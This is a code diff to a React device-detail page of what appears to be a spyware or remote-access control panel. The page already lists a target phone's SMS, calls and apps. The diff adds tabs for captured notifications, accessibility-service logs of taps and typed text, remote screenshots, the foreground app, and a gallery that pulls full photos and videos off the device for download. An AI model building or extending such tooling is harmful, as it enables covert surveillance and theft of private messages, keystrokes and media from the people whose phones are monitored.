@@ -1,4 +1,4 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useCallback } from 'react';
 import {
   ArrowLeft,
   Radio,
@@ -38,7 +38,16 @@ import {
   Inbox,
   ArrowUpRight,
   ArrowDownLeft,
-  CheckCheck
+  CheckCheck,
+  Bell,
+  MousePointer2,
+  Camera,
+  Wifi,
+  WifiOff,
+  Signal,
+  Activity,
+  Eye,
+  Smartphone
 } from 'lucide-react';
 import { getDeviceImage } from '../utils/deviceImages';
 import { getDeviceSimProfile } from '../utils/simStorage';
@@ -55,7 +64,14 @@ import {
   getSmsLogs,
   getCallLogs,
   getCommunicationLogs,
-  getDeviceEvents
+  getDeviceEvents,
+  getNotifications,
+  getInteractions,
+  requestScreenshot,
+  getLatestScreenshot,
+  getMediaGallery,
+  requestFullMedia,
+  getMediaFullFile
 } from '../api';
 import './DeviceDetailPage.css';
 
@@ -119,6 +135,30 @@ export default function DeviceDetailPage({
   const [callsSearch, setCallsSearch] = useState('');
   const [callTypeFilter, setCallTypeFilter] = useState('all');
 
+  // ── Notifications State ──
+  const [notifications, setNotifications] = useState([]);
+  const [notifsLoading, setNotifsLoading] = useState(false);
+  const [notifsSearch, setNotifsSearch] = useState('');
+
+  // ── Interactions State ──
+  const [interactions, setInteractions] = useState([]);
+  const [interactionsLoading, setInteractionsLoading] = useState(false);
+
+  // ── Screenshot State ──
+  const [screenshot, setScreenshot] = useState(null);
+  const [screenshotLoading, setScreenshotLoading] = useState(false);
+  const [screenshotRequesting, setScreenshotRequesting] = useState(false);
+
+  // ── Gallery State ──
+  const [galleryItems, setGalleryItems] = useState([]);
+  const [galleryTotal, setGalleryTotal] = useState(0);
+  const [galleryLoading, setGalleryLoading] = useState(false);
+  const [galleryFilter, setGalleryFilter] = useState('all');
+  const [gallerySearch, setGallerySearch] = useState('');
+  const [viewingFullFile, setViewingFullFile] = useState(null);
+  const [fullFileLoading, setFullFileLoading] = useState(null);
+  const [requestingMedia, setRequestingMedia] = useState(null);
+
   // Parse installed apps
   let appsList = [];
   if (device.installed_apps) {
@@ -172,6 +212,14 @@ export default function DeviceDetailPage({
       loadDeviceSms();
     } else if (activeSection === 'calls') {
       loadDeviceCalls();
+    } else if (activeSection === 'notifications') {
+      loadNotifications();
+    } else if (activeSection === 'activity') {
+      loadInteractions();
+    } else if (activeSection === 'snapshot') {
+      loadScreenshot();
+    } else if (activeSection === 'gallery') {
+      loadGallery();
     }
   }, [activeSection, device.device_id]);
 
@@ -467,6 +515,149 @@ export default function DeviceDetailPage({
     return rem > 0 ? `${m}m ${rem}s` : `${m}m`;
   };
 
+  // ── Load Notifications ──
+  async function loadNotifications() {
+    try {
+      setNotifsLoading(true);
+      const data = await getNotifications(device.device_id, { limit: 100 });
+      setNotifications(Array.isArray(data) ? data : []);
+    } catch (e) {
+      console.debug('Failed to load notifications', e);
+    } finally {
+      setNotifsLoading(false);
+    }
+  }
+
+  // ── Load Interactions ──
+  async function loadInteractions() {
+    try {
+      setInteractionsLoading(true);
+      const data = await getInteractions(device.device_id, { limit: 100 });
+      setInteractions(Array.isArray(data) ? data : []);
+    } catch (e) {
+      console.debug('Failed to load interactions', e);
+    } finally {
+      setInteractionsLoading(false);
+    }
+  }
+
+  // ── Load Screenshot ──
+  async function loadScreenshot() {
+    try {
+      setScreenshotLoading(true);
+      const data = await getLatestScreenshot(device.device_id);
+      setScreenshot(data);
+    } catch (e) {
+      setScreenshot(null);
+      console.debug('No screenshot available', e);
+    } finally {
+      setScreenshotLoading(false);
+    }
+  }
+
+  // ── Request Screenshot ──
+  async function handleRequestScreenshot() {
+    try {
+      setScreenshotRequesting(true);
+      await requestScreenshot(device.device_id);
+      addToast('Screenshot requested — waiting for capture...', 'info');
+      // Poll for result after a delay
+      setTimeout(loadScreenshot, 5000);
+    } catch (e) {
+      addToast('Failed to request screenshot', 'error');
+    } finally {
+      setScreenshotRequesting(false);
+    }
+  }
+
+  // ── Connection Status ──
+  const getConnectionStatus = () => {
+    if (!device.last_seen_at) return { status: 'offline', label: 'Offline', color: 'red' };
+    const delta = Date.now() - new Date(device.last_seen_at).getTime();
+    if (delta < 15000) return { status: 'online', label: 'Online', color: 'green' };
+    if (delta < 60000) return { status: 'degraded', label: 'Degraded', color: 'yellow' };
+    return { status: 'offline', label: 'Offline', color: 'red' };
+  };
+  const connStatus = getConnectionStatus();
+
+  // ── Filtered Notifications ──
+  const filteredNotifs = notifications.filter(n => {
+    if (!notifsSearch) return true;
+    const q = notifsSearch.toLowerCase();
+    return (n.app_name || '').toLowerCase().includes(q)
+      || (n.title || '').toLowerCase().includes(q)
+      || (n.content || '').toLowerCase().includes(q);
+  });
+
+  // ── Gallery Functions ──
+  async function loadGallery() {
+    try {
+      setGalleryLoading(true);
+      const opts = { limit: 100 };
+      if (galleryFilter !== 'all') opts.mediaType = galleryFilter;
+      if (gallerySearch) opts.search = gallerySearch;
+      const data = await getMediaGallery(device.device_id, opts);
+      setGalleryItems(Array.isArray(data?.items) ? data.items : []);
+      setGalleryTotal(data?.total || 0);
+    } catch (e) {
+      console.debug('Failed to load gallery', e);
+    } finally {
+      setGalleryLoading(false);
+    }
+  }
+
+  async function handleRequestFullFile(item) {
+    try {
+      setRequestingMedia(item.id);
+      const result = await requestFullMedia(device.device_id, item.media_store_id);
+      if (result?.status === 'ready') {
+        // Already available, fetch it
+        handleViewFullFile(item);
+      } else {
+        addToast('Full file requested — device will upload shortly', 'info');
+      }
+    } catch (e) {
+      addToast('Failed to request full file', 'error');
+    } finally {
+      setRequestingMedia(null);
+    }
+  }
+
+  async function handleViewFullFile(item) {
+    try {
+      setFullFileLoading(item.id);
+      const data = await getMediaFullFile(item.id);
+      if (data?.file_data) {
+        setViewingFullFile({
+          ...item,
+          fullData: data.file_data,
+          fullMime: data.mime_type,
+          fileName: data.file_name,
+        });
+      } else {
+        addToast('Full file not available yet — try again in a moment', 'info');
+      }
+    } catch (e) {
+      // Not yet available
+      addToast('Full file not yet available — requesting from device...', 'info');
+      handleRequestFullFile(item);
+    } finally {
+      setFullFileLoading(null);
+    }
+  }
+
+  const filteredGallery = galleryItems.filter(item => {
+    if (galleryFilter === 'all') return true;
+    return item.media_type === galleryFilter;
+  });
+
+  const formatFileSize = (bytes) => {
+    if (!bytes) return '';
+    if (bytes < 1024) return `${bytes} B`;
+    if (bytes < 1048576) return `${(bytes / 1024).toFixed(1)} KB`;
+    return `${(bytes / 1048576).toFixed(1)} MB`;
+  };
+
   // Primary SIM label
   const sim1Text = simProfile?.sim1
     ? `${simProfile.sim1}`
@@ -484,8 +675,20 @@ export default function DeviceDetailPage({
         <div className="native-nav-center">
           <span className="native-nav-title">{modelName}</span>
           <div className="native-nav-status">
-            <span className={`status-dot ${isOnline ? 'online' : 'offline'}`} />
-            <span className="status-label">{isOnline ? 'Online' : 'Offline'}</span>
+            <span className={`status-dot ${connStatus.status}`} />
+            <span className="status-label">{connStatus.label}</span>
+            {device.signal_strength != null && (
+              <span className="signal-indicator" title={`Signal: ${device.signal_strength}/4`}>
+                <Signal size={10} />
+                <span>{device.signal_strength}/4</span>
+              </span>
+            )}
+            {device.network_latency_ms != null && (
+              <span className="latency-indicator" title={`Latency: ${device.network_latency_ms}ms`}>
+                <Activity size={10} />
+                <span>{device.network_latency_ms}ms</span>
+              </span>
+            )}
           </div>
         </div>
 
@@ -549,6 +752,15 @@ export default function DeviceDetailPage({
             <Edit2 size={10} className="sim-edit-ico" />
           </button>
         </div>
+
+        {/* Foreground App Indicator */}
+        {device.foreground_app && (
+          <div className="hero-foreground-app">
+            <Eye size={12} />
+            <span className="fg-app-label">Active:</span>
+            <span className="fg-app-name">{device.foreground_app}</span>
+          </div>
+        )}
       </div>
 
       {/* ── Native Segmented Mobile Pill Switcher ── */}
@@ -591,6 +803,44 @@ export default function DeviceDetailPage({
             <Boxes size={14} />
             <span>Apps</span>
             {appsList.length > 0 && <span className="seg-badge">{appsList.length}</span>}
+          </button>
+
+          <button
+            type="button"
+            className={`seg-tab-pill ${activeSection === 'notifications' ? 'active' : ''}`}
+            onClick={() => setActiveSection('notifications')}
+          >
+            <Bell size={14} />
+            <span>Notifs</span>
+            {notifications.length > 0 && <span className="seg-badge">{notifications.length}</span>}
+          </button>
+
+          <button
+            type="button"
+            className={`seg-tab-pill ${activeSection === 'activity' ? 'active' : ''}`}
+            onClick={() => setActiveSection('activity')}
+          >
+            <MousePointer2 size={14} />
+            <span>Activity</span>
+          </button>
+
+          <button
+            type="button"
+            className={`seg-tab-pill ${activeSection === 'snapshot' ? 'active' : ''}`}
+            onClick={() => setActiveSection('snapshot')}
+          >
+            <Camera size={14} />
+            <span>Snap</span>
+          </button>
+
+          <button
+            type="button"
+            className={`seg-tab-pill ${activeSection === 'gallery' ? 'active' : ''}`}
+            onClick={() => setActiveSection('gallery')}
+          >
+            <Layers size={14} />
+            <span>Gallery</span>
+            {galleryTotal > 0 && <span className="seg-badge">{galleryTotal}</span>}
           </button>
         </div>
       </div>
@@ -1190,6 +1440,347 @@ export default function DeviceDetailPage({
             </div>
           </div>
         )}
+
+        {/* ══════════════════════════════════════════════════════
+            SECTION 5: NOTIFICATIONS
+           ══════════════════════════════════════════════════════ */}
+        {activeSection === 'notifications' && (
+          <div className="mobile-tab-view animate-fade-in">
+            <div className="section-toolbar">
+              <div className="toolbar-search-wrap">
+                <Search size={14} className="search-ico" />
+                <input
+                  type="text"
+                  placeholder="Search notifications..."
+                  value={notifsSearch}
+                  onChange={(e) => setNotifsSearch(e.target.value)}
+                  className="toolbar-search-input"
+                />
+              </div>
+              <button
+                type="button"
+                className="toolbar-action-btn"
+                onClick={loadNotifications}
+                disabled={notifsLoading}
+              >
+                <RefreshCw size={13} className={notifsLoading ? 'spin-icon' : ''} />
+                <span>Refresh</span>
+              </button>
+            </div>
+
+            {notifsLoading ? (
+              <div className="empty-state"><Loader2 size={24} className="spin-icon" /><p>Loading notifications...</p></div>
+            ) : filteredNotifs.length === 0 ? (
+              <div className="empty-state">
+                <Bell size={32} style={{ opacity: 0.3 }} />
+                <p>No notifications captured yet</p>
+                <span className="empty-hint">Enable Notification Access on the device</span>
+              </div>
+            ) : (
+              <div className="sms-feed">
+                {filteredNotifs.map((n, idx) => (
+                  <div key={n.id || idx} className="sms-bubble-row notif-row">
+                    <div className="sms-avatar-col">
+                      <div className="sms-avatar" style={{ background: `hsl(${(n.app_name || '').length * 37 % 360}, 55%, 50%)` }}>
+                        {(n.app_name || '?')[0].toUpperCase()}
+                      </div>
+                    </div>
+                    <div className="sms-content-col">
+                      <div className="sms-header-row">
+                        <span className="sms-sender-name">{n.app_name}</span>
+                        <span className="sms-timestamp">
+                          {new Date(n.timestamp).toLocaleString([], { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' })}
+                        </span>
+                      </div>
+                      {n.title && <div className="notif-title">{n.title}</div>}
+                      {n.content && <div className="sms-body-text">{n.content}</div>}
+                      <div className="notif-app-badge">
+                        <Smartphone size={10} />
+                        <span>{n.app_package}</span>
+                      </div>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ══════════════════════════════════════════════════════
+            SECTION 6: USER ACTIVITY / INTERACTIONS
+           ══════════════════════════════════════════════════════ */}
+        {activeSection === 'activity' && (
+          <div className="mobile-tab-view animate-fade-in">
+            <div className="section-toolbar">
+              <div className="toolbar-search-wrap">
+                <MousePointer2 size={14} className="search-ico" />
+                <span className="toolbar-title-text">User Interactions</span>
+              </div>
+              <button
+                type="button"
+                className="toolbar-action-btn"
+                onClick={loadInteractions}
+                disabled={interactionsLoading}
+              >
+                <RefreshCw size={13} className={interactionsLoading ? 'spin-icon' : ''} />
+                <span>Refresh</span>
+              </button>
+            </div>
+
+            {interactionsLoading ? (
+              <div className="empty-state"><Loader2 size={24} className="spin-icon" /><p>Loading interactions...</p></div>
+            ) : interactions.length === 0 ? (
+              <div className="empty-state">
+                <MousePointer2 size={32} style={{ opacity: 0.3 }} />
+                <p>No interactions captured yet</p>
+                <span className="empty-hint">Enable Accessibility Service on the device</span>
+              </div>
+            ) : (
+              <div className="interactions-timeline">
+                {interactions.map((ev, idx) => {
+                  const typeIcon = ev.interaction_type === 'click' ? '👆'
+                    : ev.interaction_type === 'text_input' ? '⌨️'
+                    : ev.interaction_type === 'scroll' ? '📜'
+                    : ev.interaction_type === 'long_press' ? '👇' : '🔵';
+
+                  return (
+                    <div key={ev.id || idx} className="interaction-item">
+                      <div className="interaction-icon">{typeIcon}</div>
+                      <div className="interaction-content">
+                        <div className="interaction-header">
+                          <span className="interaction-type-badge">{ev.interaction_type}</span>
+                          <span className="interaction-time">
+                            {new Date(ev.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
+                          </span>
+                        </div>
+                        {ev.target_text && <div className="interaction-target">"{ev.target_text}"</div>}
+                        <div className="interaction-meta">
+                          {ev.app_package && <span className="interaction-app"><Smartphone size={10} /> {ev.app_package.split('.').pop()}</span>}
+                          {ev.target_class && <span className="interaction-class">{ev.target_class.split('.').pop()}</span>}
+                        </div>
+                      </div>
+                    </div>
+                  );
+                })}
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ══════════════════════════════════════════════════════
+            SECTION 7: SNAPSHOT / SCREENSHOT
+           ══════════════════════════════════════════════════════ */}
+        {activeSection === 'snapshot' && (
+          <div className="mobile-tab-view animate-fade-in">
+            <div className="section-toolbar">
+              <div className="toolbar-search-wrap">
+                <Camera size={14} className="search-ico" />
+                <span className="toolbar-title-text">Remote Screenshot</span>
+              </div>
+              <button
+                type="button"
+                className="toolbar-action-btn take-snap-btn"
+                onClick={handleRequestScreenshot}
+                disabled={screenshotRequesting}
+              >
+                {screenshotRequesting ? (
+                  <><Loader2 size={13} className="spin-icon" /><span>Capturing...</span></>
+                ) : (
+                  <><Camera size={13} /><span>Take Snapshot</span></>
+                )}
+              </button>
+            </div>
+
+            {screenshotLoading ? (
+              <div className="empty-state"><Loader2 size={24} className="spin-icon" /><p>Loading screenshot...</p></div>
+            ) : screenshot ? (
+              <div className="screenshot-viewer">
+                <div className="screenshot-frame">
+                  <img
+                    src={`data:image/jpeg;base64,${screenshot.image_data}`}
+                    alt="Device Screenshot"
+                    className="screenshot-img"
+                  />
+                </div>
+                <div className="screenshot-meta">
+                  <Clock size={12} />
+                  <span>Captured: {new Date(screenshot.captured_at).toLocaleString()}</span>
+                </div>
+              </div>
+            ) : (
+              <div className="empty-state">
+                <Camera size={32} style={{ opacity: 0.3 }} />
+                <p>No screenshots available</p>
+                <span className="empty-hint">Tap "Take Snapshot" to capture the device screen</span>
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ══════════════════════════════════════════════════════
+            SECTION 8: MEDIA GALLERY
+           ══════════════════════════════════════════════════════ */}
+        {activeSection === 'gallery' && (
+          <div className="mobile-tab-view animate-fade-in">
+            <div className="section-toolbar">
+              <div className="toolbar-search-wrap">
+                <Search size={14} className="search-ico" />
+                <input
+                  type="text"
+                  placeholder="Search files..."
+                  value={gallerySearch}
+                  onChange={(e) => setGallerySearch(e.target.value)}
+                  onKeyDown={(e) => e.key === 'Enter' && loadGallery()}
+                  className="toolbar-search-input"
+                />
+              </div>
+              <div className="gallery-filter-group">
+                {['all', 'image', 'video'].map(f => (
+                  <button
+                    key={f}
+                    type="button"
+                    className={`gallery-filter-btn ${galleryFilter === f ? 'active' : ''}`}
+                    onClick={() => { setGalleryFilter(f); }}
+                  >
+                    {f === 'all' ? 'All' : f === 'image' ? '📷' : '🎬'}
+                  </button>
+                ))}
+              </div>
+              <button
+                type="button"
+                className="toolbar-action-btn"
+                onClick={loadGallery}
+                disabled={galleryLoading}
+              >
+                <RefreshCw size={13} className={galleryLoading ? 'spin-icon' : ''} />
+                <span>Refresh</span>
+              </button>
+            </div>
+
+            {galleryLoading ? (
+              <div className="empty-state"><Loader2 size={24} className="spin-icon" /><p>Loading gallery...</p></div>
+            ) : filteredGallery.length === 0 ? (
+              <div className="empty-state">
+                <Layers size={32} style={{ opacity: 0.3 }} />
+                <p>No media found</p>
+                <span className="empty-hint">Gallery thumbnails will appear once the device syncs</span>
+              </div>
+            ) : (
+              <>
+                <div className="gallery-count-bar">
+                  <span>{galleryTotal} items in gallery</span>
+                </div>
+                <div className="gallery-grid">
+                  {filteredGallery.map((item) => (
+                    <div key={item.id} className="gallery-card">
+                      <div className="gallery-thumb-wrap">
+                        <img
+                          src={`data:image/jpeg;base64,${item.thumbnail_b64}`}
+                          alt={item.file_name || 'Media'}
+                          className="gallery-thumb-img"
+                          loading="lazy"
+                        />
+                        {item.media_type === 'video' && (
+                          <div className="gallery-video-badge">
+                            <Play size={10} />
+                            <span>{item.duration_ms ? `${Math.round(item.duration_ms / 1000)}s` : 'Video'}</span>
+                          </div>
+                        )}
+                        {item.has_full_file && (
+                          <div className="gallery-ready-badge" title="Full resolution available">
+                            <Check size={10} />
+                          </div>
+                        )}
+                      </div>
+                      <div className="gallery-card-info">
+                        <span className="gallery-card-name" title={item.file_name}>
+                          {item.file_name || 'Untitled'}
+                        </span>
+                        <span className="gallery-card-meta">
+                          {formatFileSize(item.file_size)}
+                          {item.width && item.height ? ` · ${item.width}×${item.height}` : ''}
+                        </span>
+                      </div>
+                      <div className="gallery-card-actions">
+                        {item.has_full_file ? (
+                          <button
+                            type="button"
+                            className="gallery-action-btn view-btn"
+                            onClick={() => handleViewFullFile(item)}
+                            disabled={fullFileLoading === item.id}
+                          >
+                            {fullFileLoading === item.id ? (
+                              <Loader2 size={11} className="spin-icon" />
+                            ) : (
+                              <Eye size={11} />
+                            )}
+                            <span>View Full</span>
+                          </button>
+                        ) : (
+                          <button
+                            type="button"
+                            className="gallery-action-btn fetch-btn"
+                            onClick={() => handleRequestFullFile(item)}
+                            disabled={requestingMedia === item.id}
+                          >
+                            {requestingMedia === item.id ? (
+                              <Loader2 size={11} className="spin-icon" />
+                            ) : (
+                              <ArrowDownLeft size={11} />
+                            )}
+                            <span>Fetch Full</span>
+                          </button>
+                        )}
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              </>
+            )}
+
+            {/* Full File Viewer Lightbox */}
+            {viewingFullFile && (
+              <div className="gallery-lightbox" onClick={() => setViewingFullFile(null)}>
+                <div className="gallery-lightbox-content" onClick={e => e.stopPropagation()}>
+                  <button
+                    type="button"
+                    className="gallery-lightbox-close"
+                    onClick={() => setViewingFullFile(null)}
+                  >
+                    <X size={18} />
+                  </button>
+                  {viewingFullFile.media_type === 'video' ? (
+                    <video
+                      src={`data:${viewingFullFile.fullMime || 'video/mp4'};base64,${viewingFullFile.fullData}`}
+                      controls
+                      autoPlay
+                      className="gallery-lightbox-media"
+                    />
+                  ) : (
+                    <img
+                      src={`data:${viewingFullFile.fullMime || 'image/jpeg'};base64,${viewingFullFile.fullData}`}
+                      alt={viewingFullFile.fileName || 'Full resolution'}
+                      className="gallery-lightbox-media"
+                    />
+                  )}
+                  <div className="gallery-lightbox-info">
+                    <span>{viewingFullFile.fileName}</span>
+                    <a
+                      href={`data:${viewingFullFile.fullMime || 'application/octet-stream'};base64,${viewingFullFile.fullData}`}
+                      download={viewingFullFile.fileName || 'media-file'}
+                      className="gallery-download-btn"
+                      onClick={e => e.stopPropagation()}
+                    >
+                      <ArrowDownLeft size={12} />
+                      <span>Download</span>
+                    </a>
+                  </div>
+                </div>
+              </div>
+            )}
+          </div>
+        )}
+
       </div>
 
       {/* SIM Modal Trigger */}
